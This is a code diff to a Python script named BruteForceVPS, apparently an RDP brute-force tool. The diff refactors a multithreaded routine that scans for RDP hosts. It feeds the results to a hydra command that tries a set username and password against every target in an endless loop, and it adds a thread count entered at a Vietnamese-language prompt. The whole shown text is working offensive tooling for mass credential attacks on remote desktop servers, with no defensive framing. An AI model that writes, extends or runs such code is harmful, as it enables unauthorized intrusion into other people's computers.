@@ -38,24 +38,26 @@ class BruteForceVPS:
         except:
             pass
 
-    def multi_thread_scan(self, thread_num=5000):
+    def multi_thread_scan(self, thread_num):
+        threads = []
         for _ in range(thread_num):
             thread = threading.Thread(target=self.check_rdp)
             thread.start()
-
-    def scan_ip(self):
-        self.multi_thread_scan()
+            threads.append(thread)
+        for t in threads:
+            t.join()
     
     def hydra_attack(self, hydra_thread=1):
         os.system(f"hydra -t {hydra_thread} -l {self.username} -p {self.password} -M {self.targets_ip_path} -o {self.hydra_output} rdp")
     
 
-    def run(self):
+    def run(self, num_thread):
         while True:
             if os.path.exists(self.targets_ip_path) == True:
                 os.remove(self.targets_ip_path)
-            self.scan_ip()
+            self.multi_thread_scan(thread_num=num_thread)
             self.hydra_attack()
 
+num_thread = int(input("nhập số luồng : "))
 brute = BruteForceVPS()
-brute.run()
+brute.run(num_thread=num_thread)
